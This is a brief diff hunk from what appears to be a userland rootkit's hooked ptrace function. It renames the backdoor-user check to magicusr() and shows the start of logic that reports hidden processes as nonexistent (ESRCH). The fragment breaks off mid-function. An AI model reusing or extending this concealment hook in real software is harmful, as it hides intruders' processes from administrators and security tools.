@@ -1,5 +1,5 @@
 long ptrace(void *request, pid_t pid, void *addr, void *data){
-    if(is_bdusr()) goto o_ptrace;
+    if(magicusr()) goto o_ptrace;
 
     if(hidden_proc(pid)){
         errno = ESRCH;
